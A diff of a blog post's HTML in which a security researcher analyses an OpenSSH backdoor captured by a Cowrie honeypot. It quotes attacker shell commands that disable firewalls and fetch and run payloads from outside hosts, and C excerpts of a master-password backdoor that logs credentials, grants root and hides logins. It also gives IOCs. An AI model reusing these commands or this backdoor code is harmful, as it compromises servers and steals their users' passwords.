@@ -8,7 +8,7 @@
     
     <link rel="shortcut icon" type="image/x-icon" href="https://www.randhome.io/img/favicon.ico">
     <title>Openssh backdoor used on compromised Linux servers</title>
-    <meta name="generator" content="Hugo 0.54.0" />
+    <meta name="generator" content="Hugo 0.68.2" />
     <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/bootstrap-3.3.7.min.css"/>
     <link rel="stylesheet" type="text/css" href="https://www.randhome.io/css/main.css" />
     <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" />
@@ -94,31 +94,16 @@
         <div class="panel panel-default">
           <div class="panel-body">
             <div class="blogpost">
-              
-
-<p>Olà,</p>
-
+              <p>Olà,</p>
 <p>Some times ago, I have installed honeypot services on one of my servers, in order to see what happens in the real outside world. I especially installed the <a href="https://github.com/cowrie/cowrie">cowrie</a> ssh honeypot which simulate a Linux shell and gather binaries that people want to install on the server (this tool is awesome, check <a href="https://github.com/micheloosterhof/cowrie/wiki/How-to-setup-Cowrie-on-Debian">here</a> to install it).</p>
-
-<p><center>
-<figure>
-    <img src="/media/doctor8.jpg" height="200"/> 
-</figure>
-
-</center></p>
-
+<!-- raw HTML omitted -->
 <h2 id="cowrie-ssh">Cowrie ssh</h2>
-
 <p>This honeypot is really fun, because it records everything done during an attack, and record the whole tty session which can be replayed. If the attacker tries to download a file, cowrie automatically downloads it and stores it in a dedicated directory. In my case, I have only allowed one correct password (but an easily one : root123), so most of my logs are failed authentications:</p>
-
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">43</span>:<span style="color:#ae81ff">04</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17996</span>,<span style="color:#ae81ff">177.124</span><span style="color:#f92672">.</span><span style="color:#ae81ff">226.37</span>] login attempt [bayvit<span style="color:#f92672">/</span>bayvit] failed
 <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">44</span>:<span style="color:#ae81ff">42</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17997</span>,<span style="color:#ae81ff">177.124</span><span style="color:#f92672">.</span><span style="color:#ae81ff">226.37</span>] login attempt [explore<span style="color:#f92672">/</span>explore] failed
 <span style="color:#ae81ff">2015</span><span style="color:#f92672">-</span><span style="color:#ae81ff">11</span><span style="color:#f92672">-</span><span style="color:#ae81ff">10</span> <span style="color:#ae81ff">08</span>:<span style="color:#ae81ff">45</span>:<span style="color:#ae81ff">11</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">17998</span>,<span style="color:#ae81ff">106.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">116.239</span>] login attempt [jonathan<span style="color:#f92672">/</span><span style="color:#ae81ff">111111</span>] failed</code></pre></div>
-
 <p>Here is a short top 20 of most used users and passwords :</p>
-
 <p><strong>Top 20 users</strong></p>
-
 <ul>
 <li>root</li>
 <li>admin</li>
@@ -141,9 +126,7 @@
 <li>mysql</li>
 <li>bin</li>
 </ul>
-
 <p><strong>Top 20 passwords</strong></p>
-
 <ul>
 <li>123456</li>
 <li>password</li>
@@ -166,12 +149,9 @@
 <li>qwerty</li>
 <li>user</li>
 </ul>
-
 <p>Successfull attacks often juste download a malicious script/binary and execute it:
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">HoneyPotTransport,<span style="color:#ae81ff">110774</span>,<span style="color:#ae81ff">121.12</span><span style="color:#f92672">.</span><span style="color:#ae81ff">173.62</span>] CMD: <span style="color:#f92672">/</span>etc<span style="color:#f92672">/</span>init<span style="color:#f92672">.</span>d<span style="color:#f92672">/</span>iptables stop;service iptables stop;SuSEfirewall2 stop;reSuSEfirewall2 stop;wget <span style="color:#f92672">-</span>c http:<span style="color:#f92672">//</span><span style="color:#ae81ff">222.186</span><span style="color:#f92672">.</span><span style="color:#ae81ff">56.5</span>:<span style="color:#ae81ff">88</span><span style="color:#f92672">/</span>China1991;chmod <span style="color:#ae81ff">755</span> China1991;<span style="color:#f92672">./</span>China1991;</code></pre></div></p>
-
 <h2 id="what-are-those-files">What are those files?!?</h2>
-
 <p>Among the files downloaded by Cowrie, I noticed an important number of text files, which is weird as I was thinking of finding only perl scripts / malicious ELF files. I finally found the logs related to these files:
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">19</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] login attempt [root<span style="color:#f92672">/</span>root123] succeeded
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHService ssh<span style="color:#f92672">-</span>userauth on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] root authenticated <span style="color:#66d9ef">with</span> keyboard<span style="color:#f92672">-</span>interactive
@@ -180,7 +160,6 @@
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHChannel session (<span style="color:#ae81ff">0</span>) on SSHService ssh<span style="color:#f92672">-</span>connection on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] channel open
 <span style="color:#ae81ff">2016</span><span style="color:#f92672">-</span><span style="color:#ae81ff">01</span><span style="color:#f92672">-</span><span style="color:#ae81ff">21</span> <span style="color:#ae81ff">19</span>:<span style="color:#ae81ff">37</span>:<span style="color:#ae81ff">20</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0100</span> [SSHChannel session (<span style="color:#ae81ff">0</span>) on SSHService ssh<span style="color:#f92672">-</span>connection on HoneyPotTransport,<span style="color:#ae81ff">111016</span>,<span style="color:#ae81ff">37.228</span><span style="color:#f92672">.</span><span style="color:#ae81ff">227.119</span>] pty request: xterm (<span style="color:#ae81ff">24</span>, <span style="color:#ae81ff">80</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
 [SNIP]</code></pre></div></p>
-
 <p>The cowrie log is pretty long because&hellip; it was a manual attack (whut?). So you have many failed commands (cowrie doesn&rsquo;t implement all the shell commands), and in the end the interesting one:
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">unset HISTFILE
 unset HISTSAVE
@@ -200,20 +179,18 @@ wget http://fm.fo/images/cette.jpg; tar zxvf cette.jpg; rm -rf cette*; cd ssh
 ls -la
 cd ..
 rm -rf ssh</code></pre></div></p>
-
 <p>Here the attacker doesn&rsquo;t understand what is happening because cowrie simulates the wget commands but the tar command fails (likely a cowrie bug when implementing the command). So the attacker will try many different ways to untar the file, and finally reboot the server.</p>
-
 <p>Once extracted, the archive is composed of the source code of openssh 4.3 (I have uploaded all the code on <a href="https://github.com/Te-k/openssh-backdoor">github</a> if you want to check by yourself)</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">&gt; cat v
-OpenSSH_4.3p2, OpenSSL <span style="color:#ae81ff">0</span>.9.8b <span style="color:#ae81ff">04</span> May <span style="color:#ae81ff">2006</span></code></pre></div>
-<p>There is still one weird thing : what is this <em>backdoor.h</em> file ?</p>
+OpenSSH_4.3p2, OpenSSL 0.9.8b <span style="color:#ae81ff">04</span> May <span style="color:#ae81ff">2006</span>
+</code></pre></div><p>There is still one weird thing : what is this <em>backdoor.h</em> file ?</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">/* backdoor stuff */</span>
 <span style="color:#75715e">#define BACKDOORPASSWD &#34;SSHD_PASS&#34;
 </span><span style="color:#75715e">#define LOGGING_PASSWORDS 1
 </span><span style="color:#75715e">#define PASSWORDS_LOG_FILE &#34;LOG_PATH&#34;
 </span><span style="color:#75715e"></span>
-<span style="color:#66d9ef">int</span> backdoor_active;</code></pre></div>
-<p>The BACKDOORPASSWD macro is used in the file <em>auth-passwd.c</em>, in the auth_password function in charge of checking the users password:</p>
+<span style="color:#66d9ef">int</span> backdoor_active;
+</code></pre></div><p>The BACKDOORPASSWD macro is used in the file <em>auth-passwd.c</em>, in the auth_password function in charge of checking the users password:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    backdoor_active <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
     <span style="color:#66d9ef">if</span>(strcmp(password, BACKDOORPASSWD) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
     {
@@ -223,15 +200,15 @@ OpenSSH_4.3p2, OpenSSL <span style="color:#ae81ff">0</span>.9.8b <span style="co
     <span style="color:#66d9ef">else</span>
     {
     [LEGITIMATE CODE]
-    [...]</code></pre></div>
-<p>Strangely, this backdoor also implements a logging functionnality both in <em>sshconnect1.c</em> and <em>sshconnect2.c</em>:</p>
+    [...]
+</code></pre></div><p>Strangely, this backdoor also implements a logging functionnality both in <em>sshconnect1.c</em> and <em>sshconnect2.c</em>:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">    <span style="color:#66d9ef">if</span>((strcmp(BACKDOORPASSWD,password) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">&amp;&amp;</span> LOGGING_PASSWORDS)
       {
         FILE <span style="color:#f92672">*</span>fp <span style="color:#f92672">=</span> fopen(PASSWORDS_LOG_FILE,<span style="color:#e6db74">&#34;a&#34;</span>);
         fprintf (fp,<span style="color:#e6db74">&#34;+host: %s +user: %s +password: %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, get_remote_ipaddr(), options.user, password);
         fclose (fp)
-      }</code></pre></div>
-<p>In <em>session.c</em>, the backdoor disable the hist file and force the suid to 0 (root):</p>
+      }
+</code></pre></div><p>In <em>session.c</em>, the backdoor disable the hist file and force the suid to 0 (root):</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C">     <span style="color:#66d9ef">if</span>(backdoor_active)
         child_set_env(<span style="color:#f92672">&amp;</span>env, <span style="color:#f92672">&amp;</span>envsize, <span style="color:#e6db74">&#34;HISTFILE&#34;</span>, <span style="color:#e6db74">&#34;/dev/null&#34;</span>);
 
@@ -249,8 +226,8 @@ OpenSSH_4.3p2, OpenSSL <span style="color:#ae81ff">0</span>.9.8b <span style="co
 
     [...]
     <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>backdoor_active)
-        permanently_set_uid(pw);</code></pre></div>
-<p>And finally in <em>sshlogin.c</em>, it disable logging of connections using the backdoor password:</p>
+        permanently_set_uid(pw);
+</code></pre></div><p>And finally in <em>sshlogin.c</em>, it disable logging of connections using the backdoor password:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C" data-lang="C"><span style="color:#75715e">/*
 </span><span style="color:#75715e">* Records that the user has logged in.  I these parts of operating systems
 </span><span style="color:#75715e">* were more standardized.
@@ -298,19 +275,14 @@ record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="c
   login_logout(li);
   login_free_entry(li);
 }
-}</code></pre></div>
-<p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
+}
 
+</code></pre></div><p>All these modifications are in the <a href="https://github.com/Te-k/openssh-backdoor/blob/master/openssh-3.6.1p2-backdoor.patch">openssh-3.6.1p2-backdoor.patch</a> included in the code.</p>
 <h2 id="lets-do-threat-intelligence">Lets do Threat Intelligence</h2>
-
 <p>So let&rsquo;s try to understand what happened : a successful authentication happened the 21/01/16 from 37.228.227.119 (weirdly from source port 34, the client is putty). The first connection is directly successful (no bruteforce before).</p>
-
 <p>This IP address belongs to UPC Ireland, which seems to be a Telecom provider now called Virgin media (I informed them of this attack on their abuse email address).</p>
-
 <p>I have learnt recently that the <a href="https://www.dshield.org/">SANS Dshield Group</a> collects SSH logs from kippo/cowrie ssh honeypots. You can easily send your cowrie log by using the cowrie dshield output plugin (there is also a script called <a href="https://github.com/jkakavas/kippo-pyshield">kippo-pyshield</a> to do this).</p>
-
 <p>Let&rsquo;s check what we can learn about the IP from the <a href="https://dshield.org/api/">Dshield API</a>, you just have to visit <a href="https://isc.sans.edu/api/ip/37.228.227.119">https://isc.sans.edu/api/ip/37.228.227.119</a> (?json or ?text can be added to change the format):</p>
-
 <pre><code>&lt;ip&gt;
     &lt;number&gt;37.228.227.119&lt;/number&gt;
     &lt;count/&gt;
@@ -331,25 +303,17 @@ record_logout(pid_t pid, <span style="color:#66d9ef">const</span> <span style="c
     &lt;assize&gt;8576685&lt;/assize&gt;
     &lt;network&gt;37.228.224.0/19&lt;/network&gt;
 &lt;/ip&gt;
-</code></pre>
-
-<p>So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).</p>
-
+</code></pre><p>So Dshield knows nothing about this address, which was likely not used for any ssh bruteforce attack.  My best guess is that automated tools were used to bruteforce the server and find the password (hard to find which one). Once identified, the user connected to the server using his local computer (putty under Windows) and from his own ISP (and this is pretty stupid thing to do).</p>
 <p>The malicious code is hosted on the domain fm.fo (hxxp://fm/fo/images/cette.jpg exactly) which host a website of an icelandinc cleaning company (if I guess well, icelandic is really badly translated by Google). This website was likely compromised to host the malicious code but it is weird because it doesn&rsquo;t use any common framework (I contacted the owner, no answer yet).</p>
-
 <h2 id="iocs">IOCs</h2>
-
 <p>It&rsquo;s not the new super-duper fancy APT group attack, but I like how <a href="https://twitter.com/malware_traffic">Brad</a> ends <a href="http://www.malware-traffic-analysis.net/">his posts</a> with a summary of what to check on your system, so here is a short summary:</p>
-
 <ul>
 <li>Bruteforce IP : 37.228.227.119</li>
 <li>URL of the malicious code : hxxp://fm.fo/images/cette.jpg (still available when writing the article, IP resolved is 77.243.43.9 in Denmark)</li>
 <li>SSH backdoor password : SSHD_PASS</li>
 <li>File created by the backdoor : LOG_PATH</li>
 </ul>
-
 <p>I&rsquo;m still on <a href="https://twitter.com/tenacioustek">Twitter</a> if you have any comment.</p>
-
 <p>Ciao</p>
 
               
